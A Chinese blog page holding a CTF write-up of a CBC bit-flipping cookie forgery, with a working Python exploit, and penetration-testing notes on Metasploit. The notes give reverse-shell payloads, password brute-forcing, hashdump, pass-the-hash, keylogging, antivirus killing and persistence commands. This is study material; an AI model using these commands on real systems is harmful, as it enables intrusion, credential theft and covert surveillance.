unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> //根据session中username参数，控制显示结果</span><br><span class="line">//如果没有设置参数，进入判断cookie路径</span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    //session要为admin</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"> //入口</span><br><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    //post传参不能为admin</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>我已经在其中做出详细的注释<br>首先从入口开始验证post是否传参username和password，这里要求传入的用户名不能为admin。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    //post传参不能为admin</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>接着对传入参数序列化，接着对起进行一次CBC加密，得到了COOKIE值iv和cipher，以及session值username，对解密结果进行反序列化，设置session中的username为反序列化后数组中的username的值，但是这里又要传入的username参数为admin。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        //进行CBC模式的AES解密</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            //对解密结果进行反序列化，设置session中的username为反序列化后数组中的username的值</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以我们利用CBC翻转字节，传入Admin绕过过滤，再在加密过程中将A翻转为a，通过验证。<br>修改代码如下：    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import urllib,base64,requests,re</span><br><span class="line"></span><br><span class="line">url = &quot;http://*.*.*.*/index.php&quot;</span><br><span class="line">datas = &#123;</span><br><span class="line">    &quot;username&quot; : &quot;Admin&quot;,</span><br><span class="line">    &quot;password&quot; : &quot;test&quot;</span><br><span class="line">&#125;</span><br><span class="line">#第一组明文：a:2:&#123;s:8:&quot;userna</span><br><span class="line">#第二组明文：me&quot;;s:5:&quot;admin&quot;;</span><br><span class="line">#第三组明文：s:8:&quot;password&quot;;s</span><br><span class="line">#第四组明文：:4:&quot;test&quot;;&#125;</span><br><span class="line">#修改过程</span><br><span class="line">r = requests.post(url,data=datas)</span><br><span class="line">cipher = r.cookies.get(&quot;cipher&quot;)#获取初始密文</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">offset = 9</span><br><span class="line">new_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]#字节翻转</span><br><span class="line">new_cookies = requests.utils.dict_from_cookiejar(r.cookies)</span><br><span class="line">new_cookies[&quot;cipher&quot;] = urllib.quote_plus(base64.b64encode(new_cipher))</span><br><span class="line">#修复过程</span><br><span class="line">r2 = requests.get(url,cookies=new_cookies)</span><br><span class="line">#获得损坏的第一段明文</span><br><span class="line">plain = base64.b64decode(re.findall(&quot;decode(&apos;(.*)&apos;)&quot;,r2.text)[0])</span><br><span class="line">iv = base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))</span><br><span class="line">old = plain[:len(iv)]</span><br><span class="line">new = &apos;a:2:&#123;s:8:&quot;userna&apos;</span><br><span class="line">new_iv = &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])</span><br><span class="line">new_cookies[&quot;iv&quot;] = urllib.quote_plus(base64.b64encode(new_iv))</span><br><span class="line"></span><br><span class="line">r3 = requests.get(url,cookies=new_cookies)</span><br><span class="line">print(r3.text)</span><br></pre></td></tr></table></figure>
<p>最后将修改的iv和cipher设为cookies得到flag   </p>
<p>CBC翻转字节攻击属于密码学的题目，关键是理解加密解密过程和异或操作，后面还遇到了翻转攻击与SQL注入的结合题型，值得继续了解。。。  </p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Metasploit 整理笔记(更新中)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/06/12/Metasploit 整理笔记(更新中)/" class="article-date">
      <time datetime="2018-06-12T03:35:12.000Z" itemprop="datePublished">2018-06-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/12/Metasploit 整理笔记(更新中)/">Metasploit 整理笔记</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h4 id="一．名词解释"><a href="#一．名词解释" class="headerlink" title="一．名词解释"></a>一．名词解释</h4><h5 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h5><p>测试者利用它来攻击一个系统，程序，或服务，以获得开发者意料之外的结果。常见的有内存溢出，网站程序漏洞利用，配置错误exploit。  </p>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p>我们想让被攻击系统执行的程序，如reverse shell 可以从目标机器与测试者之间建立一<br>个反响连接，bind shell     绑定一个执行命令的通道至测试者的机器。payload 也可以是只能在目标机器上执行有限命令的程序 。  </p>
<h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p>是进行攻击时的一系列被当作payload的指令，通常在目标机器上执行之后提供一个可执行命令的shell。</p>
<h5 id="module"><a href="#module" class="headerlink" title="module"></a>module</h5><p>MSF 的模块，由一系列代码组成。    </p>
<h5 id="listener"><a href="#listener" class="headerlink" title="listener"></a>listener</h5><p>等待来自被攻击机器的incoming连接的监听在测试者机器上的程序  </p>
<h4 id="二-编码器"><a href="#二-编码器" class="headerlink" title="二. 编码器"></a>二. 编码器</h4><p>msfencode –l 查看可用的编码器（encoders），效果最佳的是x86/shikata_ga_nai  </p>
<h4 id="三．信息刺探与收集"><a href="#三．信息刺探与收集" class="headerlink" title="三．信息刺探与收集"></a>三．信息刺探与收集</h4><h5 id="1、攻击第一步：基础信息收集"><a href="#1、攻击第一步：基础信息收集" class="headerlink" title="1、攻击第一步：基础信息收集"></a>1、攻击第一步：基础信息收集</h5><p>①whois 查询：<br>msf &gt; whois example.com<br>msf&gt; whois 192.168.1.100  </p>
<p>②在线手机服务器IP工具  </p>
<p>③nslookup<br>set type=mx<br>example.com  </p>
<h5 id="2、用nmap-探测开放端口和服务："><a href="#2、用nmap-探测开放端口和服务：" class="headerlink" title="2、用nmap 探测开放端口和服务："></a>2、用nmap 探测开放端口和服务：</h5><p>-sS SYN 半开扫描<br>-sT TCP 半开扫描<br>-Pn 不使用ping方式探测主机<br>-A 探测服务类型<br>-6 开启IPV6 扫描<br>-O 探测操作系统版本  </p>
<p>常用扫描参数组合：<br>nmap –sS –Pn 192.168.0.111<br>nmap –sS –Pn –A 192.168.0.111   </p>
<h5 id="3、MSF-与postgresql-协同工作"><a href="#3、MSF-与postgresql-协同工作" class="headerlink" title="3、MSF 与postgresql 协同工作"></a>3、MSF 与postgresql 协同工作</h5><p>/etc/init.d/postgreql-8.3 start<br>msf&gt; db_connect postgres:toor@127.0.0.1/msf<br>msf&gt; db_status<br>导入nmap 扫描的结果：<br>nmap –sS –Pn –A –oX Subnet1 192.168.1.0/24 #   -oX 扫描结果导出为Subnet1.xml   </p>
<p>msf&gt; db_import Subnet1.xml  </p>
<p>msf&gt; db_hosts –c address #查看导入的主机IP<br>（msf 也可以和mysql 一起工作，在bt5 r1 中msf 默认支持连接mysql：<br>msf&gt; db_driver mysql<br>msf&gt; db_connect root:toor@127.0.0.1/msf3    #连接本机mysql 的msf3 数据库<br>mysql 默认密码toor，使用db_connect连接时会自动创建msf3 库）</p>
<h5 id="4、高级扫描方式："><a href="#4、高级扫描方式：" class="headerlink" title="4、高级扫描方式："></a>4、高级扫描方式：</h5><p>①msf&gt; use auxiliary/scanner/ip/ipidseq #IPID 序列扫描器，与nmap 的-sI -O 选项类似<br>show options<br>set RHOSTS 192.168.1.0/24<br>set RPORT 8080<br>set THREADS 50<br>run  （RHOSTS、RPORT 等参数也可以用小写）<br>②msf&gt; nmap –PN –sI 192.168.1.09 192.168.1.155<br>③nmap 连接数据库：<br>msf&gt; db_connect postgres:toor@127.0.0.1/msf<br>msf&gt; db_nmap –sS –A 192.168.1.111<br>msf&gt; db_services #查看扫描结果<br>④使用portscan 模块：<br>msf&gt; search postscan<br>msf&gt; use scanner/postscan/syn<br>set RHOSTS 192.168.1.111<br>set THREADS 50<br>run  </p>
<h5 id="5、特定扫描："><a href="#5、特定扫描：" class="headerlink" title="5、特定扫描："></a>5、特定扫描：</h5><p>smb_version 模块：<br>msf&gt; use auxiliary/scanner/smb/smb_version<br>show options<br>set RHOSTS 192.168.1.111<br>run<br>db_hosts –c address,os_flavor<br>查找mssql 主机：<br>msf&gt; use auxiliary/scanner/mssql/mssql_ping<br>show options<br>set RHOSTS 192.168.1.0/24<br>set THREADS 255<br>run  </p>
<p>SSH 服务器扫描：<br>msf&gt; use auxiliary/scanner/ssh/ssh_version<br>set THREADS 50<br>run   </p>
<p>FTP 主机扫描：<br>msf&gt; use auxiliary/scanner/ftp/ftp_version<br>show options<br>set RHOSTS 192.168.1.0/24<br>set THREADS 255<br>run   </p>
<p>扫描FTP 匿名登录：<br>use auxiliary/scanner/ftp/anonymos<br>set RHOSTS 192.168.1.0/24<br>set THREADS 50<br>run   </p>
<p>扫描SNMP 主机：<br>msf&gt; use auxiliary/scanner/snmp/snmp_login<br>set RHOSTS 192.168.1.0/24<br>set THREADS 50<br>run  </p>
<h4 id="四．基本漏洞扫描"><a href="#四．基本漏洞扫描" class="headerlink" title="四．基本漏洞扫描"></a>四．基本漏洞扫描</h4><h5 id="1、使用nc与目标端口通信，获取目标端口的信息："><a href="#1、使用nc与目标端口通信，获取目标端口的信息：" class="headerlink" title="1、使用nc与目标端口通信，获取目标端口的信息："></a>1、使用nc与目标端口通信，获取目标端口的信息：</h5><p>nc 192.168.1.111 80<br>GET HTTP 1/1<br>Server: Microsoft-IIS/5.1<br>（1：还有一个功能与nc 类似的工具Ncat，产自nmap 社区，可实现相同功能：<br>ncat -C 192.168.1.111 80<br>GET / HTTP/1.0  </p>
<p>2：题外：ncat   还可以做聊天服务器呢！在服务器端监听然后多个客户端直接连上就可以聊天了：服务器（chatserver）：ncatncat -l –chat 其他客户端：ncat chatserver   </p>
<p>3：ncat 还可以用来查看各种客户端的请求信息，比如论坛里有人问中国菜刀有木有后门，那么可以这样查看中国菜刀连接后门时发送的数据：<br>服务器（server.example.com）上：<br>ncat -l   –keep-open 80 –output caidao.log &gt; /dev/null<br>然后使用菜刀连接<a href="http://server.example.com/nc.php" target="_blank" rel="noopener">http://server.example.com/nc.php</a> 并请求操作，这是菜刀发送的数据就保存到服务器的caidao.log里面了。也可以导出为hex格式，–output 换为–hex-dump就可以了。  </p>
<p>4：其实与nc 功能类似的工具在kali里面还有很多，比如还有一个sbd：<br>监听：sbd -l -p 12345<br>连接：sbd 192.168.1.111 12345  </p>
<p>5：当然也可以用来聊天，与ncat的不同之处在于ncat 自动对用户编号user1、user2、…，而sbd可以自定义昵称，且不需要专门单独监听为聊天服务器：<br>pc1：sbd -l -p 12345 -P chowner<br>pc2：sbd pc1 12345 -P evil  </p>
<p>6：其实nc 也可以用来聊天的：<br>pc1：nc -l -p 12345<br>pc2:telnet pc1 12345）  </p>
<h5 id="3、与nessus-结合扫描："><a href="#3、与nessus-结合扫描：" class="headerlink" title="3、与nessus 结合扫描："></a>3、与nessus 结合扫描：</h5><p>使用Nessus 扫描完成后生成.nessus格式的报告，导入到MSF：<br>db_connect postgres:toor@127.0.0.1/msf<br>db_import /tmp/nessus_report_Host_test.nessus<br>db_hosts –c address,svcs,vulns<br>db_vulns<br>在MSF 中使用Nessus：<br>db_connect postgres:toor@127.0.0.1/msf<br>load nessus<br>nessus_connect nessus:toor@192.168.1.111:8834   ok<br>nessus_policy_list #查看存在的扫描规则<br>nessus_scan_new 2 bridge_scan 192.168.1.111 #2 表示规则的ID 号，bridge_scan 自定义扫描名称<br>nessus_scan_status #查看扫描进行状态<br>nessus_report_list #查看扫描结果<br>nessus_report_get skjla243-3b5d-* #导入报告<br>db_hosts –c address,svcs,vulns  </p>
<h5 id="4、特殊扫描："><a href="#4、特殊扫描：" class="headerlink" title="4、特殊扫描："></a>4、特殊扫描：</h5><p>SMB 弱口令:<br>msf&gt; use auxiliary/scanner/smb/smb_login<br>set RHOSTS 192.168.1.111-222<br>set SMBUser Administrator<br>set SMBPass admin<br>run  </p>
<p>VNC 空口令：<br>msf&gt; use auxiliary/scanner/vnc/vnc_none_auth<br>set RHOSTS 192.168.1.111<br>run  </p>
<p>Open X11 空口令：<br>msf&gt; use auxiliary/scanner/x11/open_x11<br>set RHOST 192.168.1.0/24<br>set THREADS 50<br>run  </p>
<p>当扫描到此漏洞的主机后可以使用xspy工具来监视对方的键盘输入：<br>cd /pentest/sniffers/xspy/<br>./xspy –display 192.168.1.125:0 –delay 100  </p>
<h4 id="五．基础溢出命令"><a href="#五．基础溢出命令" class="headerlink" title="五．基础溢出命令"></a>五．基础溢出命令</h4><h5 id="1、基本命令："><a href="#1、基本命令：" class="headerlink" title="1、基本命令："></a>1、基本命令：</h5><p>查看可用溢出模块show exploits<br>查看辅助模块show auxiliary    包括扫描器，拒绝服务模块，fuzzer 工具或其他<br>查看可用选项show options  </p>
<p>加载模块后退出此模块back<br>例子：<br>msf&gt; use windows/smb/ms08_067_netapi<br>back  </p>
<p>搜索模块search<br>例子： searh mssql search ms08_067<br>查看当前模块可用的payload： show payloads<br>例子：<br>use windows/smb/ms08_067_netapi<br>show payloads<br>set payload windows/shell/reverse_tcp<br>show options<br><strong>查看可选的目标类型</strong>show targets<br><strong>查看更多信息</strong>info<br>设置一个选项或取消设置set/unset<br>设置或取消全局选项setg/unsetg 例如设置LHOST 就可以用setg，避免后面重复设置<br>保存全局选项的设置save 当下次启动仍然生效<br>查看建立的session sessions –l<br>激活session sessions –i num #num 为session 编号  </p>
<h5 id="2、暴力端口探测："><a href="#2、暴力端口探测：" class="headerlink" title="2、暴力端口探测："></a>2、暴力端口探测：</h5><p>当主机端口对外开放但是普通探测方法无法探测到时，用此模块，msf将对目标的所有端口进行尝试，直到找到一个开放端口并与测试者建立连接。<br>例子：<br>use exploit/windows/smb/ms08_067_netapi<br>set LHOST 192.168.1.111<br>set RHOST 192.168.1.122<br>set TARGET 39 #Windows XP SP3 Chinese -Simplified (NX)<br>search ports #搜索与ports 相关模块<br>set PAYLOAD windows/meterpreter/reverse_tcp_allports<br>exploit –j #作为后台任务运行<br>sessions –l –v<br>sesssions –i 1   </p>
<h5 id="3、MSF-脚本文件："><a href="#3、MSF-脚本文件：" class="headerlink" title="3、MSF 脚本文件："></a>3、MSF 脚本文件：</h5><p>为了缩短测试时间可以将msf命令写入一个文件，然后在msf 中加载它。加载方式：msfconsole 的resource 命令或者msfconsole 加上-r 选项  </p>
<h4 id="六．METERPRETER"><a href="#六．METERPRETER" class="headerlink" title="六．METERPRETER"></a>六．METERPRETER</h4><h5 id="1、当对目标系统进行溢出时，使用meterpreter-作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。"><a href="#1、当对目标系统进行溢出时，使用meterpreter-作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。" class="headerlink" title="1、当对目标系统进行溢出时，使用meterpreter 作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。"></a>1、当对目标系统进行溢出时，使用meterpreter 作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。</h5><p>例子：<br>msf&gt; nmap –sT –A –P0 192.168.1.130   #探测开放服务<br>假如已经探测到1433（TCP）和1434(UDP)端口（mssql），<br>msf&gt; nmap –sU 192.168.1.130 –P 1434   #确认端口开放<br>msf&gt; use auxiliary/scanner/mssql/mssql_ping<br>show options<br>set RHOSTS 192.168.1.1/24<br>set THREADS 20<br>exploit<br>至此可获取服务器名称，版本号等信息。<br>msf&gt; use auxiliary/scanner/mssql/mssql_login<br>show options<br>set PASS_FILE   /pentest/exploits/fasttrack/bin/dict/wordlist.txt<br>set RHOSTS 192.168.1.130<br>set THREADS 10<br>set verbose false<br>exploit<br>暴力猜解登陆密码。接下来使用mssql自带的xp_cmdshell 功能添加账户：<br>msf&gt; use exploit/windows/mssql/mssql_payload<br>show options<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 192.168.1.111<br>set LPORT 433<br>set RHOST 192.168.1.130<br>set PASSWORD password130<br>exploit<br>当获取到一个meterpreter shell后可以执行更多的操作：获取屏幕截图：screenshot<br>获取系统信息：sysinfo<br>获取键盘记录：<br>meterpreter&gt; ps   </p>
<p>#查看目标机器进程，假设发现explorer.exe的进程号为1668:<br>meterpreter&gt; migrate 1668 #插入该进程<br>meterpreter&gt; run   post/windows/capture/keylog_recorder #运行键盘记录模块，将击键记录保存到本地txt<br>cat /root/.msf3/loot/*.txt #查看结果  </p>
<p>获取系统账号密码：<br>meterpreter&gt; use priv<br>meterpreter&gt; run post/windows/gather/hashdump<br>当获取到密码的hash之后无法破解出明文密码且无法直接使用hash 登陆，需要使用pass-the-hash 技术  ：<br>msf&gt; use windows/smb/psexec<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.1.111<br>set LPORT 443<br>set RHOST 192.168.1.130<br>set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29<br>exploit<br>获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：  </p>
<p>在目标机器上执行：net uaer hacker pass /add<br>本地生成一个后门程序：<br>msfpayload windows/meterpreter/reverse_tcp<br>LHOST=192.168.1.111 LPORT=443 X &gt;payload.exe<br>将payload.exe拷贝到目标机器然后使用新建立的账号执行本地执行端口监听，等待来自目标机器连接：<br>msfcli multi/handler    PAYLOAD=windows/meterpreter/reverse_tcp<br>LHOST=192.168.1.111 LPORT=443<br>use priv<br>getsystem<br>getuid<br>至此取得SYSTEM 权限   </p>
<h5 id="2、令牌模拟：当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。"><a href="#2、令牌模拟：当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。" class="headerlink" title="2、令牌模拟：当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。"></a>2、令牌模拟：当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。</h5><p>meterpreter&gt; ps #    查看目标机器进程，找出域控账户运行的进程ID，假如发现PID 为380<br>meterpreter&gt; steal_token 380<br>有时ps 命令列出的进程中可能不存在域控账户的进程，此时使用incognito 模块查看可用token：<br>meterpreter&gt; use incognito<br>meterpreter&gt; list_tokens –u    #列出可用token，假如找到域控token<br>meterpreter&gt; impersonate_token    SNEAKS.IN\ihazdomainadmin<br>meterpreter&gt; add_user hacker password –h 192.168.1.50 #在域控主机上添加账户<br>meterpreter&gt; add_group_user “Domain Admins” hacker –h 192.168.1.50 #将账户添加至域管理员组   </p>
<h5 id="3、内网渗透：当取得同网段内一台主机的权限后可以进一步渗透网内其他主机："><a href="#3、内网渗透：当取得同网段内一台主机的权限后可以进一步渗透网内其他主机：" class="headerlink" title="3、内网渗透：当取得同网段内一台主机的权限后可以进一步渗透网内其他主机："></a>3、内网渗透：当取得同网段内一台主机的权限后可以进一步渗透网内其他主机：</h5><p>例子：<br>meterpreter&gt; run get_local_subnets #查看网段/子网<br>Local subnet: 192.168.33.0/255.255.255.0<br>meterpreter&gt; background #转入后台运行<br>msf&gt; route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息<br>msf&gt; route print #查看添加的信息<br>msf&gt; use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻<br>set payload linux/x86/shell/reverse_tcp<br>set LHOST 10.10.1.129 #此处为attacking 主机的外网IP<br>set LPORT 8080<br>set RHOST 192.168.33.132 #内网目标主机<br>exploit<br>也可以使用自动式添加路由模块：<br>msf&gt; load auto_add_route<br>msf&gt; exploit  </p>
<h5 id="4、Meterpreter-脚本："><a href="#4、Meterpreter-脚本：" class="headerlink" title="4、Meterpreter 脚本："></a>4、Meterpreter 脚本：</h5><p>使用run scriptname 方式执行<br>①vnc 脚本,获取远程机器vnc 界面控制<br>meterpreter&gt; run vnc<br>meterpreter&gt; run screen_unlock<br>②进程迁移<br>当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp   进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。<br>例子：<br>meterpreter&gt; run post/windows/manage/migrate<br>（在64 位win7 中migrate需要管理员权限执行后门才能成功，而migrate 前后获取的权限是有差异的。）<br>③关闭杀毒软件<br>meterpreter&gt; run killav   （这个脚本要小心使用，可能导致目标机器蓝屏死机。）<br>④获取系统密码hash<br>meterpreter&gt; run hashdump<br>（64 位win7 下需要管理员权限执行后门且先getsystem，然后使用run post/windows/gather/hashdump 来dump hash 成功率更高。而且如果要使用shell 添加系统账户的话win7 下得先：<br>run post/windows/escalate/bypassuac ，不然可能不会成功。）<br>⑤获取系统流量数据<br>meterpreter&gt; run packtrecorder –i 1<br>⑥直捣黄龙<br>可以干很多事情：获取密码，下载注册表，获取系统信息等<br>meterpreter&gt; run scraper<br>⑦持久保持<br>当目标机器重启之后仍然可以控制<br>meterpreter&gt; run persistence –X –i 50 –p 443 –r 192.168.1.111<br>-X 开机启动-i 连接超时时间–p 端口–rIP<br>下次连接时：<br>msf&gt; use multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set LPOST 443<br>set LHOST 192.168.1.111<br>exploit<br>(会在以下位置和注册表以随机文件名写入文件等信息，如：<br>C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs<br>C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe<br>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)<br>⑧POST 整合模块<br>可实现同时多个session 操作<br>例子：获取hash<br>meterpreter&gt; run post/windows/gather/hashdump<br>其他还有很多，使用TAB 键补全看下就知道run post/   </p>
<h5 id="5、升级command-shell"><a href="#5、升级command-shell" class="headerlink" title="5、升级command shell"></a>5、升级command shell</h5><p>例子：<br>msfconsole<br>msf&gt; search ms08_067<br>msf&gt; use windows/smb/ms08_067_netapi<br>set PAYLOAD windows/shell/reverse_tcp<br>set TARGET 3<br>setg LHOST 192.168.1.111<br>setg LPORT 8080<br>exploit –z #后台运行，如果此处未使用-z参数，后面可以按CTRL-Z 转到后台<br>sessions –u 1 #升级shell，必须前面使用setg 设定<br>sessions –i 2   </p>
<h5 id="6、使用Railgun-操作windows-APIs"><a href="#6、使用Railgun-操作windows-APIs" class="headerlink" title="6、使用Railgun 操作windows APIs"></a>6、使用Railgun 操作windows APIs</h5><p>例子：<br>meterpreter&gt; irb   </p>
<p> client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”)<br>在目标机器上会弹出一个标题栏为world和内容为hello 的窗口  </p>
